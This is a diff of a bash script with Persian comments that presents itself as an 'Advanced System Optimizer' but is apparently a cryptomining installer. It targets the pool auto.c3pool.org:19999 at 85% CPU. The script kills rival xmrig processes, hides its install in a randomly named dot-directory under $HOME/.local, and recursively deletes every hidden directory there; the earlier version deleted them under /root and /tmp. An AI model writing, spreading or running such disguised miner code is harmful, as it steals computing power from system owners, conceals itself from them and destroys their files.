@@ -1,7 +1,7 @@
 #!/bin/bash
-VERSION=2.31
+VERSION=2.32
 echo "Advanced System Optimizer v$VERSION"
-echo "Fixed for Proxmox/LXC - auto.c3pool.org:19999 - 85% CPU"
+echo "Path in .local - Works on Proxmox/PVE - auto.c3pool.org:19999 - 85% CPU"
 echo
 export LC_ALL=C
 export LANG=C
@@ -26,23 +26,12 @@ CPU_HINT=85
 
 echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT%"
 
-# --- انتخاب مسیر (Proxmox-safe, prioritize /root) ---
-BASE_DIR=""
-for candidate in "/root" "/tmp" "/var/tmp" "$HOME/.cache"; do
-    TEST_DIR="$candidate/.test_$(openssl rand -hex 4)"
-    if mkdir -p "$TEST_DIR" 2>/dev/null && touch "$TEST_DIR/test" 2>/dev/null && rm -rf "$TEST_DIR" 2>/dev/null; then
-        BASE_DIR="$candidate"
-        break
-    fi
-done
-
-[ -z "$BASE_DIR" ] && echo "ERROR: No writable path" && exit 1
-
+# --- مسیر در .local ---
 RAND_HEX=$(openssl rand -hex 16)
-BASE_DIR="$BASE_DIR/.$RAND_HEX"
+BASE_DIR="$HOME/.local/.$RAND_HEX"
 LOG_DIR="$BASE_DIR/.log"
 
-echo "[*] Installing in: $BASE_DIR (hidden, Proxmox-safe)"
+echo "[*] Installing in: $BASE_DIR (hidden in .local)"
 
 # --- ساخت مسیر با چک ---
 if ! mkdir -p "$BASE_DIR" "$LOG_DIR" 2>/dev/null; then
@@ -53,7 +42,7 @@ chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null
 
 # --- پاک‌سازی ---
 pkill -9 -f xmrig 2>/dev/null
-find /root /tmp /var/tmp "$HOME/.cache" -type d -name ".*" -exec rm -rf {} + 2>/dev/null
+find $HOME/.local -type d -name ".*" -exec rm -rf {} + 2>/dev/null
 
 # --- hugepages ---
 if [ "$(id -u)" -eq 0 ]; then
